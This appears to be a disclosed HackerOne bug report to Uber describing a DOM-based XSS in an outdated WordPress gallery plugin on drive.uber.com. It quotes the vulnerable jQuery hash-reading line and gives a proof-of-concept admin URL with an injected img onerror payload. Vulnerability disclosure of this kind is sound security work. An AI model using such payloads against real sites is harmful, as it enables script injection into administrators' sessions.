@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/139875
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/blackzero
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:26.05.2016 0:19:31
+
+Summary:
+
+Possible Remote code execution DOM based XSS 
+
+Vuln Jquery param :
+var strliID=jQuery(location).attr('hash');
+
+Target: Logged admin
+Go url >> https://drive.uber.com/melbourne/wp-admin/admin.php?page=Options_gallery_styles#"><img src=M onerror=alert('0wn3d');>
+
+Solution : Upgrade latest version gallery plugin (Your version v1.9.55)
+
+
+Test my localhost picture attached:
+
+Regards..
